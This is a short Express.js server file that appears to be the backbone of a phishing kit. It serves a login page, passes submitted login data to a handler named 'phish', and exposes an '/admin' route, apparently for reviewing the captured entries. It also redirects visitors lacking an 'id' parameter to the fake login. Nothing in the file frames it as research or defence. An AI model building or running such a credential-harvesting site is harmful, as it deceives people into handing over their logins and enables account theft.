import express from 'express'
import path from 'path'
import phish from './controllers/phish.js'
import admin from './controllers/admin.js'
const app = express()
import('dotenv').then(dotenv => dotenv.config())
const port = process.env.PORT || 8080

app.use(express.static(path.resolve('public')))
app.use(express.json())

app.set('view engine', 'ejs')
app.set('views', path.resolve('views'))

app.get("/", (req, res) => {
    const { id } = req.query
    id ? res.render('home') : res.redirect('/login')
})
app.get('/login', (req, res) => {
    res.render('login')
})
app.post('/login', phish)
app.get('/admin', admin)
app.use((req, res) => {
    res.status(404).json({'msg': '404 not found!'})
})

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}...`)
})